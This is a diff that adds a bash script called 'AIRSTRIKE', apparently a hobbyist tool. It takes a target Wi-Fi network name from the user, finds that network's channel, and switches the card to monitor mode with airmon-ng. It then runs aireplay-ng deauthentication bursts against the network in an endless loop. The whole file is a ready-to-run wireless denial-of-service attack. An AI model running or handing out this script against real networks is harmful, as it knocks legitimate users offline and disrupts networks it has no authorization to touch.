@@ -1,0 +1,32 @@
+#!/bin/bash
+echo "    ___________"
+echo "   /           \ "
+echo "   ) $(tput bold)AIRSTRIKE$(tput sgr0) ("
+echo "   \___________/"
+echo ""
+echo "Author - psychokiller"
+echo "aircrack-ng gets boring..."
+echo ""
+trap ctrl_c INT;
+function ctrl_c() {
+	echo ""
+	airmon-ng stop $(printf '%bmon' $interface) >> /dev/null;
+	echo "bringing $(tput bold)$interface$(tput sgr0) back online";
+	exit 0;
+}
+ifconfig | grep flags;
+printf "select a wireless interface to use >> ";
+read interface;
+printf "Select a $(tput bold)target$(tput sgr0) to attack >> ";
+read target;
+echo "[ gathering target information ]";
+channel=$(iwlist $interface scan | grep "$target" -B 4 | grep Channel: | tr -dc '0-9');
+airmon-ng start $interface | grep NONEXISTANT;
+#every time I try to use >> /dev/null here I get a grep invalid argument error despite never using grep... must be somethigng with airmon-ng...
+printf "select the the interval for each attack sequence (higher for single node networks, lower for roaming configurations) >> ";
+read interval;
+iwconfig $(printf '%bmon' $interface) channel $channel && printf "switching to $target\'s channel $channel";
+echo "";
+while true; 
+	do aireplay-ng -0 $interval -e "$target" $(printf '%bmon' $interface) >> /dev/null && echo "$(tput bold)Attacking Network$(tput sgr0) @ $interval deauths per sequence";
+done
